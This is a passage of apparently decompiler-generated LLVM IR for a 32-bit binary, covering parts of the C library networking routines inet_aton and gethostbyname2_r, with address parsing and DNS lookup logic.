  store i32 %v2_804c63c, i32* %esi.global-to-local, align 4
  %v0_804c640 = load i32, i32* %edi.global-to-local, align 4
  %v1_804c640 = add i32 %v0_804c640, 17
  store i32 %v1_804c640, i32* %edi.global-to-local, align 4
  %v2_804c643 = load i32, i32* %stack_var_-27, align 4
  %v4_804c643 = inttoptr i32 %v1_804c640 to i32*
  store i32 %v2_804c643, i32* %v4_804c643, align 4
  %v5_804c643 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c643 = load i32, i32* %esi.global-to-local, align 4
  %v7_804c643 = load i1, i1* @df, align 1
  %v8_804c643 = select i1 %v7_804c643, i32 -4, i32 4
  %v9_804c643 = add i32 %v8_804c643, %v5_804c643
  %v10_804c643 = add i32 %v8_804c643, %v6_804c643
  store i32 %v9_804c643, i32* %edi.global-to-local, align 4
  store i32 %v10_804c643, i32* %esi.global-to-local, align 4
  %v1_804c644 = inttoptr i32 %v10_804c643 to i32*
  %v2_804c644 = load i32, i32* %v1_804c644, align 4
  %v4_804c644 = inttoptr i32 %v9_804c643 to i32*
  store i32 %v2_804c644, i32* %v4_804c644, align 4
  %v5_804c644 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c644 = load i32, i32* %esi.global-to-local, align 4
  %v9_804c644 = add i32 %v5_804c644, %v8_804c643
  %v10_804c644 = add i32 %v6_804c644, %v8_804c643
  store i32 %v9_804c644, i32* %edi.global-to-local, align 4
  store i32 %v10_804c644, i32* %esi.global-to-local, align 4
  %v1_804c645 = inttoptr i32 %v10_804c644 to i32*
  %v2_804c645 = load i32, i32* %v1_804c645, align 4
  %v4_804c645 = inttoptr i32 %v9_804c644 to i32*
  store i32 %v2_804c645, i32* %v4_804c645, align 4
  %v5_804c645 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c645 = load i32, i32* %esi.global-to-local, align 4
  %v9_804c645 = add i32 %v5_804c645, %v8_804c643
  %v10_804c645 = add i32 %v6_804c645, %v8_804c643
  store i32 %v9_804c645, i32* %edi.global-to-local, align 4
  store i32 %v10_804c645, i32* %esi.global-to-local, align 4
  %v1_804c646 = inttoptr i32 %v10_804c645 to i32*
  %v2_804c646 = load i32, i32* %v1_804c646, align 4
  %v4_804c646 = inttoptr i32 %v9_804c645 to i32*
  store i32 %v2_804c646, i32* %v4_804c646, align 4
  %v5_804c646 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c646 = load i32, i32* %esi.global-to-local, align 4
  %v9_804c646 = add i32 %v5_804c646, %v8_804c643
  %v10_804c646 = add i32 %v6_804c646, %v8_804c643
  store i32 %v9_804c646, i32* %edi.global-to-local, align 4
  store i32 %v10_804c646, i32* %esi.global-to-local, align 4
  %v1_804c647 = inttoptr i32 %v10_804c646 to i16*
  %v2_804c647 = load i16, i16* %v1_804c647, align 2
  %v4_804c647 = inttoptr i32 %v9_804c646 to i16*
  store i16 %v2_804c647, i16* %v4_804c647, align 2
  %v5_804c647 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c647 = load i32, i32* %esi.global-to-local, align 4
  %v8_804c647 = select i1 %v7_804c643, i32 -2, i32 2
  %v9_804c647 = add i32 %v5_804c647, %v8_804c647
  %v10_804c647 = add i32 %v6_804c647, %v8_804c647
  store i32 %v9_804c647, i32* %edi.global-to-local, align 4
  store i32 %v10_804c647, i32* %esi.global-to-local, align 4
  %v1_804c649 = inttoptr i32 %v10_804c647 to i8*
  %v2_804c649 = load i8, i8* %v1_804c649, align 1
  %v4_804c649 = inttoptr i32 %v9_804c647 to i8*
  store i8 %v2_804c649, i8* %v4_804c649, align 1
  %v5_804c649 = load i32, i32* %edi.global-to-local, align 4
  %v6_804c649 = load i32, i32* %esi.global-to-local, align 4
  %v7_804c649 = load i1, i1* @df, align 1
  %v8_804c649 = select i1 %v7_804c649, i32 -1, i32 1
  %v9_804c649 = add i32 %v8_804c649, %v5_804c649
  %v10_804c649 = add i32 %v8_804c649, %v6_804c649
  store i32 %v9_804c649, i32* %edi.global-to-local, align 4
  store i32 %v10_804c649, i32* %esi.global-to-local, align 4
  %v0_804c64a = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804c64a, i32* %eax.global-to-local, align 4
  %v2_804c64c = inttoptr i32 %v9_804c649 to i32*
  store i32 %v0_804c64a, i32* %v2_804c64c, align 4
  %v3_804c64c = load i32, i32* %edi.global-to-local, align 4
  %v5_804c64c = select i1 %v7_804c649, i32 -4, i32 4
  %v6_804c64c = add i32 %v3_804c64c, %v5_804c64c
  store i32 %v6_804c64c, i32* %edi.global-to-local, align 4
  %v0_804c64d = load i32, i32* %eax.global-to-local, align 4
  %v2_804c64d = inttoptr i32 %v6_804c64c to i32*
  store i32 %v0_804c64d, i32* %v2_804c64d, align 4
  %v3_804c64d = load i32, i32* %edi.global-to-local, align 4
  %v6_804c64d = add i32 %v3_804c64d, %v5_804c64c
  store i32 %v6_804c64d, i32* %edi.global-to-local, align 4
  %v0_804c64e = load i32, i32* %eax.global-to-local, align 4
  %v2_804c64e = inttoptr i32 %v6_804c64d to i32*
  store i32 %v0_804c64e, i32* %v2_804c64e, align 4
  %v3_804c64e = load i32, i32* %edi.global-to-local, align 4
  %v6_804c64e = add i32 %v3_804c64e, %v5_804c64c
  store i32 %v6_804c64e, i32* %edi.global-to-local, align 4
  %v0_804c64f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c64f = trunc i32 %v0_804c64f to i8
  %v3_804c64f = inttoptr i32 %v6_804c64e to i8*
  store i8 %v1_804c64f, i8* %v3_804c64f, align 1
  %v4_804c64f = load i32, i32* %edi.global-to-local, align 4
  %v5_804c64f = load i1, i1* @df, align 1
  %v6_804c64f = select i1 %v5_804c64f, i32 -1, i32 1
  %v7_804c64f = add i32 %v6_804c64f, %v4_804c64f
  store i32 %v7_804c64f, i32* %edi.global-to-local, align 4
  %v0_804c650.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804c655.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804c650

dec_label_pc_804c650:                             ; preds = %entry, %dec_label_pc_804c61b
  %v2_804c655 = phi i32 [ %v0_804c5f9, %entry ], [ %v2_804c655.pre, %dec_label_pc_804c61b ]
  %v0_804c650 = phi i32 [ %v1_804c612, %entry ], [ %v0_804c650.pre, %dec_label_pc_804c61b ]
  store i32 %v0_804c650, i32* %eax.global-to-local, align 4
  store i32 %v2_804c655, i32* @esi, align 4
  ret i32 %v0_804c650

; uselistorder directives
  uselistorder i32 %v0_804c650, { 1, 0 }
  uselistorder i32 %v1_804c612, { 1, 0 }
  uselistorder i32 %v3_804c60d, { 0, 2, 1 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804c650, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804c663 = icmp eq i8* %arg1, null
  br i1 %v1_804c663, label %dec_label_pc_804c6e4, label %dec_label_pc_804c667

dec_label_pc_804c667:                             ; preds = %entry
  %v4_804c65f = ptrtoint i8* %arg1 to i32
  %v0_804c672.pre = load i32, i32* @global_var_8053338, align 8
  br label %dec_label_pc_804c672

dec_label_pc_804c672:                             ; preds = %dec_label_pc_804c667, %dec_label_pc_804c6bb
  %v12_804c6c357 = phi i1 [ false, %dec_label_pc_804c667 ], [ %v12_804c6c3, %dec_label_pc_804c6bb ]
  %v2_804c6c055 = phi i32 [ 1, %dec_label_pc_804c667 ], [ %v3_804c6c0, %dec_label_pc_804c6bb ]
  %v0_804c67854 = phi i32 [ %v4_804c65f, %dec_label_pc_804c667 ], [ %v0_804c6783, %dec_label_pc_804c6bb ]
  %v0_804c6d553 = phi i32 [ 0, %dec_label_pc_804c667 ], [ %v2_804c6be, %dec_label_pc_804c6bb ]
  %v1_804c678 = inttoptr i32 %v0_804c67854 to i8*
  %v2_804c678 = load i8, i8* %v1_804c678, align 1
  %v3_804c678 = zext i8 %v2_804c678 to i32
  %v2_804c67b = mul nuw nsw i32 %v3_804c678, 2
  %v3_804c67b = add i32 %v2_804c67b, %v0_804c672.pre
  %v4_804c67b = inttoptr i32 %v3_804c67b to i8*
  %v5_804c67b = load i8, i8* %v4_804c67b, align 1
  %v6_804c67b = and i8 %v5_804c67b, 8
  %v7_804c67b = icmp eq i8 %v6_804c67b, 0
  br i1 %v7_804c67b, label %dec_label_pc_804c6e4, label %dec_label_pc_804c682

dec_label_pc_804c682:                             ; preds = %dec_label_pc_804c672
  %v4_804c696.pre = load i32, i32* @edx, align 4
  %v2_804c69634 = load i8, i8* %v1_804c678, align 1
  %v3_804c69635 = zext i8 %v2_804c69634 to i32
  %v5_804c69636 = and i32 %v4_804c696.pre, -256
  %v6_804c69637 = or i32 %v3_804c69635, %v5_804c69636
  store i32 %v6_804c69637, i32* @edx, align 4
  %v2_804c69b38 = mul nuw nsw i32 %v3_804c69635, 2
  %v3_804c69b39 = add i32 %v2_804c69b38, %v0_804c672.pre
  %v4_804c69b40 = inttoptr i32 %v3_804c69b39 to i16*
  %v5_804c69b41 = load i16, i16* %v4_804c69b40, align 2
  %v2_804c6a043 = and i16 %v5_804c69b41, 8
  %v3_804c6a044 = icmp eq i16 %v2_804c6a043, 0
  %v1_804c6a245 = icmp eq i1 %v3_804c6a044, false
  br i1 %v1_804c6a245, label %dec_label_pc_804c686, label %dec_label_pc_804c6a4

dec_label_pc_804c686:                             ; preds = %dec_label_pc_804c682, %dec_label_pc_804c695
  %v6_804c69649 = phi i32 [ %v6_804c696, %dec_label_pc_804c695 ], [ %v6_804c69637, %dec_label_pc_804c682 ]
  %v3_804c69648 = phi i32 [ %v3_804c696, %dec_label_pc_804c695 ], [ %v3_804c69635, %dec_label_pc_804c682 ]
  %v0_804c69547 = phi i32 [ %v1_804c695, %dec_label_pc_804c695 ], [ %v0_804c67854, %dec_label_pc_804c682 ]
  %v1_804c68646 = phi i32 [ %v3_804c689, %dec_label_pc_804c695 ], [ 0, %dec_label_pc_804c682 ]
  %v3_804c686 = mul i32 %v1_804c68646, 10
  %v2_804c689 = add i32 %v3_804c686, -48
  %v3_804c689 = add i32 %v2_804c689, %v3_804c69648
  %v1_804c68d = add i32 %v3_804c689, -255
  %v6_804c68d = sub i32 254, %v3_804c689
  %v7_804c68d = and i32 %v6_804c68d, %v3_804c689
  %v8_804c68d = icmp slt i32 %v7_804c68d, 0
  %v9_804c68d = icmp eq i32 %v1_804c68d, 0
  %v10_804c68d = icmp slt i32 %v1_804c68d, 0
  %v3_804c693 = icmp eq i1 %v10_804c68d, %v8_804c68d
  %v4_804c693 = icmp eq i1 %v9_804c68d, false
  %v5_804c693 = and i1 %v4_804c693, %v3_804c693
  br i1 %v5_804c693, label %dec_label_pc_804c6e4, label %dec_label_pc_804c695

dec_label_pc_804c695:                             ; preds = %dec_label_pc_804c686
  %v1_804c695 = add i32 %v0_804c69547, 1
  %v1_804c696 = inttoptr i32 %v1_804c695 to i8*
  %v2_804c696 = load i8, i8* %v1_804c696, align 1
  %v3_804c696 = zext i8 %v2_804c696 to i32
  %v5_804c696 = and i32 %v6_804c69649, -256
  %v6_804c696 = or i32 %v3_804c696, %v5_804c696
  store i32 %v6_804c696, i32* @edx, align 4
  %v2_804c69b = mul nuw nsw i32 %v3_804c696, 2
  %v3_804c69b = add i32 %v2_804c69b, %v0_804c672.pre
  %v4_804c69b = inttoptr i32 %v3_804c69b to i16*
  %v5_804c69b = load i16, i16* %v4_804c69b, align 2
  %v2_804c6a0 = and i16 %v5_804c69b, 8
  %v3_804c6a0 = icmp eq i16 %v2_804c6a0, 0
  %v1_804c6a2 = icmp eq i1 %v3_804c6a0, false
  br i1 %v1_804c6a2, label %dec_label_pc_804c686, label %dec_label_pc_804c6a4

dec_label_pc_804c6a4:                             ; preds = %dec_label_pc_804c695, %dec_label_pc_804c682
  %v1_804c686.lcssa = phi i32 [ 0, %dec_label_pc_804c682 ], [ %v3_804c689, %dec_label_pc_804c695 ]
  %v0_804c695.lcssa = phi i32 [ %v0_804c67854, %dec_label_pc_804c682 ], [ %v1_804c695, %dec_label_pc_804c695 ]
  %v2_804c696.lcssa = phi i8 [ %v2_804c69634, %dec_label_pc_804c682 ], [ %v2_804c696, %dec_label_pc_804c695 ]
  %v6_804c69b.lcssa.in = phi i16 [ %v5_804c69b41, %dec_label_pc_804c682 ], [ %v5_804c69b, %dec_label_pc_804c695 ]
  br i1 %v12_804c6c357, label %dec_label_pc_804c6b2, label %dec_label_pc_804c6aa

dec_label_pc_804c6aa:                             ; preds = %dec_label_pc_804c6a4
  %v10_804c6aa = icmp eq i8 %v2_804c696.lcssa, 46
  %v1_804c6ad = icmp eq i1 %v10_804c6aa, false
  br i1 %v1_804c6ad, label %dec_label_pc_804c6e4, label %dec_label_pc_804c6af

dec_label_pc_804c6af:                             ; preds = %dec_label_pc_804c6aa
  %v1_804c6af = add i32 %v0_804c695.lcssa, 1
  br label %dec_label_pc_804c6bb

dec_label_pc_804c6b2:                             ; preds = %dec_label_pc_804c6a4
  %v1_804c6b2 = add i32 %v0_804c695.lcssa, 1
  %v4_804c6b3 = icmp eq i8 %v2_804c696.lcssa, 0
  br i1 %v4_804c6b3, label %dec_label_pc_804c6bb, label %dec_label_pc_804c6b7

dec_label_pc_804c6b7:                             ; preds = %dec_label_pc_804c6b2
  %v2_804c6b7 = and i16 %v6_804c69b.lcssa.in, 32
  %v3_804c6b7 = icmp eq i16 %v2_804c6b7, 0
  br i1 %v3_804c6b7, label %dec_label_pc_804c6e4, label %dec_label_pc_804c6bb

dec_label_pc_804c6bb:                             ; preds = %dec_label_pc_804c6b7, %dec_label_pc_804c6b2, %dec_label_pc_804c6af
  %v0_804c6783 = phi i32 [ %v1_804c6b2, %dec_label_pc_804c6b7 ], [ %v1_804c6b2, %dec_label_pc_804c6b2 ], [ %v1_804c6af, %dec_label_pc_804c6af ]
  %v2_804c6bb = mul i32 %v0_804c6d553, 256
  %v2_804c6be = or i32 %v1_804c686.lcssa, %v2_804c6bb
  %v3_804c6c0 = add nuw nsw i32 %v2_804c6c055, 1
  %v12_804c6c3 = icmp eq i32 %v3_804c6c0, 4
  %v7_804c6c7 = icmp sgt i32 %v2_804c6c055, 3
  br i1 %v7_804c6c7, label %dec_label_pc_804c6c9, label %dec_label_pc_804c672

dec_label_pc_804c6c9:                             ; preds = %dec_label_pc_804c6bb
  %v4_804c6ce = icmp eq i32 %arg2, 0
  br i1 %v4_804c6ce, label %dec_label_pc_804c6e6, label %dec_label_pc_804c6d5

dec_label_pc_804c6d5:                             ; preds = %dec_label_pc_804c6c9
  %v1_804c6d5 = call i32 @llvm.bswap.i32(i32 %v2_804c6be)
  %v2_804c6db = inttoptr i32 %arg2 to i32*
  store i32 %v1_804c6d5, i32* %v2_804c6db, align 4
  br label %dec_label_pc_804c6e6

dec_label_pc_804c6e4:                             ; preds = %dec_label_pc_804c6b7, %dec_label_pc_804c6aa, %dec_label_pc_804c672, %dec_label_pc_804c686, %entry
  br label %dec_label_pc_804c6e6

dec_label_pc_804c6e6:                             ; preds = %dec_label_pc_804c6c9, %dec_label_pc_804c6d5, %dec_label_pc_804c6e4
  %v0_804c6eb = phi i32 [ 1, %dec_label_pc_804c6c9 ], [ 1, %dec_label_pc_804c6d5 ], [ 0, %dec_label_pc_804c6e4 ]
  ret i32 %v0_804c6eb

; uselistorder directives
  uselistorder i32 %v0_804c695.lcssa, { 1, 0 }
  uselistorder i32 %v6_804c696, { 1, 0 }
  uselistorder i32 %v3_804c696, { 2, 1, 0 }
  uselistorder i32 %v1_804c695, { 0, 2, 1 }
  uselistorder i32 %v1_804c68d, { 1, 0 }
  uselistorder i32 %v3_804c689, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v0_804c672.pre, { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804c6e6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c6e4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804c686, { 1, 0 }
  uselistorder label %dec_label_pc_804c672, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = ptrtoint i32* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_804c6ec = load i32, i32* @ebp, align 4
  %v0_804c6ed = load i32, i32* @edi, align 4
  %v0_804c6ee = load i32, i32* @esi, align 4
  %v0_804c6ef = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @edi, align 4
  %v9_804c6fb = icmp eq i32 %arg2, 2
  %v1_804c6fe = icmp eq i1 %v9_804c6fb, false
  br i1 %v1_804c6fe, label %dec_label_pc_804c722, label %dec_label_pc_804c700

dec_label_pc_804c700:                             ; preds = %entry
  store i32 %arg7, i32* %stack_var_-80, align 4
  %v6_804c715 = inttoptr i32 %arg1 to i8*
  %v7_804c715 = call i32 @gethostbyname_r(i8* %v6_804c715, i32 %tmp9, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  store i32 %v7_804c715, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c722:                             ; preds = %entry
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v1_804c726 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v1_804c726, align 4
  %v0_804c72c = load i32, i32* %eax.global-to-local, align 4
  %v9_804c72c = icmp eq i32 %v0_804c72c, 10
  %v1_804c72f = icmp eq i1 %v9_804c72c, false
  br i1 %v1_804c72f, label %dec_label_pc_804c97b, label %dec_label_pc_804c735

dec_label_pc_804c735:                             ; preds = %dec_label_pc_804c722
  %v4_804c735 = icmp eq i32 %arg1, 0
  br i1 %v4_804c735, label %dec_label_pc_804c97b, label %dec_label_pc_804c740

dec_label_pc_804c740:                             ; preds = %dec_label_pc_804c735
  %v1_804c740 = call i32 @__GI___errno_location(i32 %v0_804c6ef)
  store i32 %v1_804c740, i32* @eax, align 4
  store i32 %v1_804c740, i32* @esi, align 4
  %v1_804c747 = inttoptr i32 %v1_804c740 to i32*
  %v2_804c747 = load i32, i32* %v1_804c747, align 4
  store i32 %v2_804c747, i32* @ebp, align 4
  store i32 0, i32* %v1_804c747, align 4
  store i32 %arg7, i32* %stack_var_-80, align 4
  %v0_804c757 = load i32, i32* @edi, align 4
  %v7_804c766 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 10, i32 %tmp9, i32 %arg4, i32 %v0_804c757, i32 %arg6, i32 %arg7)
  store i32 %v7_804c766, i32* %eax.global-to-local, align 4
  %v1_804c76e = icmp eq i32 %v7_804c766, 0
  %v1_804c770 = icmp eq i1 %v1_804c76e, false
  br i1 %v1_804c770, label %dec_label_pc_804c779, label %dec_label_pc_804c772

dec_label_pc_804c772:                             ; preds = %dec_label_pc_804c740
  %v0_804c772 = load i32, i32* @ebp, align 4
  %v1_804c772 = load i32, i32* @esi, align 4
  %v2_804c772 = inttoptr i32 %v1_804c772 to i32*
  store i32 %v0_804c772, i32* %v2_804c772, align 4
  %v0_804c987.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c779:                             ; preds = %dec_label_pc_804c740
  store i32 %arg7, i32* %ecx.global-to-local, align 4
  %v1_804c77d = inttoptr i32 %arg7 to i32*
  %v2_804c77d = load i32, i32* %v1_804c77d, align 4
  store i32 %v2_804c77d, i32* %edx.global-to-local, align 4
  %v9_804c77f = icmp eq i32 %v2_804c77d, 1
  br i1 %v9_804c77f, label %dec_label_pc_804c792, label %dec_label_pc_804c784

dec_label_pc_804c784:                             ; preds = %dec_label_pc_804c779
  %v9_804c784 = icmp eq i32 %v2_804c77d, 4
  br i1 %v9_804c784, label %dec_label_pc_804c7a5, label %dec_label_pc_804c789

dec_label_pc_804c789:                             ; preds = %dec_label_pc_804c784
  %v1_804c789 = add i32 %v2_804c77d, 1
  %v8_804c789 = icmp eq i32 %v1_804c789, 0
  store i32 %v1_804c789, i32* %edx.global-to-local, align 4
  %v1_804c78a = icmp eq i1 %v8_804c789, false
  br i1 %v1_804c78a, label %dec_label_pc_804c980, label %dec_label_pc_804c79c

dec_label_pc_804c792:                             ; preds = %dec_label_pc_804c779
  %v9_804c794 = icmp eq i32 %v7_804c766, 2
  %v1_804c797 = zext i1 %v9_804c794 to i32
  br label %dec_label_pc_804c7a7

dec_label_pc_804c79c:                             ; preds = %dec_label_pc_804c789
  %v0_804c79c = load i32, i32* @esi, align 4
  %v1_804c79c = inttoptr i32 %v0_804c79c to i32*
  %v2_804c79c = load i32, i32* %v1_804c79c, align 4
  %v11_804c79c = icmp eq i32 %v2_804c79c, 2
  %v1_804c79f = icmp eq i1 %v11_804c79c, false
  br i1 %v1_804c79f, label %dec_label_pc_804c980, label %dec_label_pc_804c7a5

dec_label_pc_804c7a5:                             ; preds = %dec_label_pc_804c79c, %dec_label_pc_804c784
  br label %dec_label_pc_804c7a7

dec_label_pc_804c7a7:                             ; preds = %dec_label_pc_804c792, %dec_label_pc_804c7a5
  %storemerge = phi i32 [ 0, %dec_label_pc_804c7a5 ], [ %v1_804c797, %dec_label_pc_804c792 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v0_804c7a7 = load i32, i32* @ebp, align 4
  %v1_804c7a7 = load i32, i32* @esi, align 4
  %v2_804c7a7 = inttoptr i32 %v1_804c7a7 to i32*
  store i32 %v0_804c7a7, i32* %v2_804c7a7, align 4
  store i32 -1, i32* %v1_804c77d, align 4
  %v1_804c7b7 = sub i32 0, %arg4
  %v1_804c7b9 = urem i32 %v1_804c7b7, 4
  store i32 %v1_804c7b9, i32* %edx.global-to-local, align 4
  %v0_804c7bc = load i32, i32* @edi, align 4
  %v2_804c7bc = sub i32 %v0_804c7bc, %v1_804c7b9
  store i32 %v2_804c7bc, i32* @edi, align 4
  %v1_804c7be = add i32 %v2_804c7bc, -24
  store i32 %v1_804c7be, i32* @esi, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  %v7_804c7cc = icmp sgt i32 %v1_804c7be, 255
  br i1 %v7_804c7cc, label %dec_label_pc_804c7d2, label %dec_label_pc_804c980

dec_label_pc_804c7d2:                             ; preds = %dec_label_pc_804c7a7
  %v2_804c7d6 = add i32 %v1_804c7b9, %arg4
  store i32 %v2_804c7d6, i32* @ebp, align 4
  %v1_804c7d8 = add i32 %v2_804c7d6, 16
  store i32 %v1_804c7d8, i32* %edx.global-to-local, align 4
  %v1_804c7df = add i32 %v2_804c7d6, 24
  store i32 %v1_804c7df, i32* %ecx.global-to-local, align 4
  %v3_804c7e6 = inttoptr i32 %v1_804c7d8 to i32*
  store i32 %v2_804c7d6, i32* %v3_804c7e6, align 4
  %v0_804c7e9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c7e9 = add i32 %v0_804c7e9, 4
  %v2_804c7e9 = inttoptr i32 %v1_804c7e9 to i32*
  store i32 0, i32* %v2_804c7e9, align 4
  %v0_804c7f0 = load i32, i32* @esi, align 4
  store i32 %v0_804c7f0, i32* %stack_var_-80, align 4
  %v0_804c7f5 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804c7f6 = inttoptr i32 %v0_804c7f5 to i8*
  %v4_804c7f6 = call i32 @strncpy(i8* %v3_804c7f6, i32 %arg1, i32 %v0_804c7f0)
  store i32 %v4_804c7f6, i32* %eax.global-to-local, align 4
  %v0_804c7fb = load i32, i32* @ebp, align 4
  %v1_804c7fb = load i32, i32* @esi, align 4
  %v2_804c7fb = add i32 %v0_804c7fb, 24
  %v3_804c7fb = add i32 %v2_804c7fb, %v1_804c7fb
  %v4_804c7fb = inttoptr i32 %v3_804c7fb to i8*
  store i8 0, i8* %v4_804c7fb, align 1
  %v2_804c807 = inttoptr i32 %arg1 to i8*
  %v3_804c807 = call i32 @inet_pton(i32 10, i8* %v2_804c807)
  store i32 %v3_804c807, i32* %eax.global-to-local, align 4
  %v1_804c80f = icmp eq i32 %v3_804c807, 0
  br i1 %v1_804c80f, label %dec_label_pc_804c849, label %dec_label_pc_804c813

dec_label_pc_804c813:                             ; preds = %dec_label_pc_804c7d2
  store i32 %tmp9, i32* %edi.global-to-local, align 4
  store i32 %v1_804c7df, i32* %arg3, align 4
  %v1_804c81d = add i32 %tmp9, 8
  %v2_804c81d = inttoptr i32 %v1_804c81d to i32*
  store i32 10, i32* %v2_804c81d, align 4
  %v0_804c824 = load i32, i32* %edi.global-to-local, align 4
  %v1_804c824 = add i32 %v0_804c824, 12
  %v2_804c824 = inttoptr i32 %v1_804c824 to i32*
  store i32 16, i32* %v2_804c824, align 4
  store i32 %v1_804c7d8, i32* %edx.global-to-local, align 4
  %v1_804c82f = load i32, i32* %edi.global-to-local, align 4
  %v2_804c82f = add i32 %v1_804c82f, 16
  %v3_804c82f = inttoptr i32 %v2_804c82f to i32*
  store i32 %v1_804c7d8, i32* %v3_804c82f, align 4
  store i32 %arg6, i32* %ecx.global-to-local, align 4
  %v0_804c836 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804c836, i32* %v1_804c726, align 4
  store i32 %arg7, i32* %edi.global-to-local, align 4
  store i32 0, i32* %v1_804c77d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c849:                             ; preds = %dec_label_pc_804c7d2
  %v0_804c849 = load i32, i32* @ebx, align 4
  %v1_804c849 = icmp eq i32 %v0_804c849, 0
  br i1 %v1_804c849, label %dec_label_pc_804c859, label %dec_label_pc_804c84d

dec_label_pc_804c84d:                             ; preds = %dec_label_pc_804c849
  store i32 %arg7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c897

dec_label_pc_804c859:                             ; preds = %dec_label_pc_804c849
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_804c85e = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_804c85e, i32* %edx.global-to-local, align 4
  %tmp31 = bitcast i32* %stack_var_-60 to i8*
  store i32 %v2_804c85e, i32* %edi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804c866 = call i8* @_memset(i8* %tmp31, i32 0, i32 10)
  %v6_804c866 = ptrtoint i8* %v5_804c866 to i32
  store i32 %v6_804c866, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %stack_var_-76, align 4
  %v2_804c86f = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804c86f, i32* @edi, align 4
  %v4_804c87f = inttoptr i32 %v1_804c7df to i8*
  %v9_804c8bf = icmp eq i32 %tmp4, 5
  %v1_804c8c2 = icmp eq i1 %v9_804c8bf, false
  br label %dec_label_pc_804c873

dec_label_pc_804c873:                             ; preds = %dec_label_pc_804c8d9, %dec_label_pc_804c859
  store i32 %v2_804c85e, i32* %eax.global-to-local, align 4
  store i32 %v2_804c85e, i32* %stack_var_-80, align 4
  %v5_804c87f = call i32 @__dns_lookup(i8* %v4_804c87f, i32 28, i32 %v2_804c86f, i32 %v2_804c85e)
  store i32 %v5_804c87f, i32* %eax.global-to-local, align 4
  store i32 %v5_804c87f, i32* @ebx, align 4
  %v2_804c889 = icmp slt i32 %v5_804c87f, 0
  %v1_804c88b = icmp eq i1 %v2_804c889, false
  br i1 %v1_804c88b, label %dec_label_pc_804c8a1, label %dec_label_pc_804c88d

dec_label_pc_804c88d:                             ; preds = %dec_label_pc_804c873
  store i32 %arg7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c897

dec_label_pc_804c897:                             ; preds = %dec_label_pc_804c84d, %dec_label_pc_804c88d
  store i32 1, i32* %v1_804c77d, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c8a1:                             ; preds = %dec_label_pc_804c873
  %v0_804c8a1 = load i32, i32* @esi, align 4
  store i32 %v0_804c8a1, i32* %stack_var_-80, align 4
  %v3_804c8a2 = load i32, i32* %stack_var_-60, align 4
  %v4_804c8aa = call i32 @strncpy(i8* %v4_804c87f, i32 %v3_804c8a2, i32 %v0_804c8a1)
  store i32 %v4_804c8aa, i32* %eax.global-to-local, align 4
  %v3_804c8af = load i32, i32* %stack_var_-60, align 4
  %v1_804c8b3 = call i32 @free(i32 %v3_804c8af)
  store i32 %tmp4, i32* @eax, align 4
  br i1 %v1_804c8c2, label %dec_label_pc_804c911, label %dec_label_pc_804c8c4

dec_label_pc_804c8c4:                             ; preds = %dec_label_pc_804c8a1
  %v2_804c8c4 = load i32, i32* %stack_var_-76, align 4
  %v3_804c8c4 = add i32 %v2_804c8c4, 1
  store i32 %v3_804c8c4, i32* %stack_var_-76, align 4
  %v7_804c8cb = icmp sgt i32 %v3_804c8c4, 5
  br i1 %v7_804c8cb, label %dec_label_pc_804c8cd, label %dec_label_pc_804c8d9

dec_label_pc_804c8cd:                             ; preds = %dec_label_pc_804c8c4
  store i32 %arg7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c90c

dec_label_pc_804c8d9:                             ; preds = %dec_label_pc_804c8c4
  %v0_804c8d9 = load i32, i32* @esi, align 4
